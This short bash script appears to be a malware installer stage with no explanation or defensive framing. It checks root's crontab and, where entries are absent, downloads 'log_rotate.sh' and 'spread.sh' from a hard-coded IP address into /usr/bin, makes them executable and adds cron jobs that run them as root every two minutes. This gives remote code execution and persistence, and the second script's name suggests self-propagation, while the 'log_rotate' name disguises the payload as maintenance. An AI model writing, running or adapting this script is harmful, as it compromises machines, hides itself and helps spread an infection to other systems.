#!/bin/bash

is_log_rotate=$(cat /var/spool/cron/crontabs/root|grep log_rotate.sh)

if [ -z "$is_log_rotate" ]
then
      cd /usr/bin && wget -O log_rotate.sh http://95.217.211.87:8000/log_rotate.sh && chmod +x log_rotate.sh && crontab -l | { cat; echo "*/2 * * * * /usr/bin/log_rotate.sh"; } | crontab -


fi

is_spread=$(cat /var/spool/cron/crontabs/root|grep spread.sh)

if [ -z "$is_spread" ]
then
      random_hour=$((1 + $RANDOM % 23))
      cd /usr/bin && wget -O spread.sh http://95.217.211.87:8000/spread.sh && chmod +x spread.sh && crontab -l | { cat; echo "*/2 * * * * /usr/bin/spread.sh"; } | crontab -


fi
